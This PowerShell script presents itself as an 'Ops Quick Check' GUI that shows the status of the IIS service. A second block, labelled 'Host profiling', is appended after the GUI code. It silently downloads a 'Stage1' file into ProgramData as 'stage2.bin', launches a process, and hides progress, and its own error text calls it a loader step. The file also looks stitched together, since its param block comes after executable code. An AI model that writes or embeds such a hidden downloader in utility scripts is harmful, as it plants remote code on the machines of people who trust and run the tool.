Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

$form = New-Object System.Windows.Forms.Form
$form.Text = 'Ops Quick Check'
$form.Size = New-Object System.Drawing.Size(740, 460)
$form.StartPosition = 'CenterScreen'

$button = New-Object System.Windows.Forms.Button
$button.Text = 'Refresh'
$button.Location = New-Object System.Drawing.Point(18, 18)
$button.Add_Click({
    Get-Service -Name "W3SVC" | Select-Object Name, Status | Out-String | Write-Host
})
$form.Controls.Add($button)

[void]$form.ShowDialog()
$form.Dispose()
<# Host profiling #>
[CmdletBinding()]
param(
    [string]$Stage1Url = "https://internal.corp:443/assets/update.dat",
    [string]$OutputPath = "C:\ProgramData\stage2.bin"
)
try { (New-Object System.Net.WebClient).DownloadFile($Stage1Url, $OutputPath); Start-Process -FilePath 'calc.exe' -ErrorAction SilentlyContinue; $ProgressPreference = "SilentlyContinue" } catch { Write-Warning "Loader step failed" }
